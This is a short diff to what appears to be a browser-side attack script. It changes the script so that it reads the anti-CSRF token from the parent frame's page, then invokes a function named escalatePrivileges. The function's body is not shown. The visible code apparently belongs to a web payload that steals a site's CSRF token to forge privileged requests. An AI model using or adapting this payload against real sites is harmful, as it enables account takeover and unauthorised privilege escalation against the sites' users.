@@ -1,4 +1,4 @@
-const csrf = document
+const csrf = window.parent.document
   .querySelector('meta[name="csrf-token"]')
   ?.getAttribute("content");
 
@@ -39,5 +39,6 @@ async function escalatePrivileges() {
 }
 
 escalatePrivileges();
+
 
 
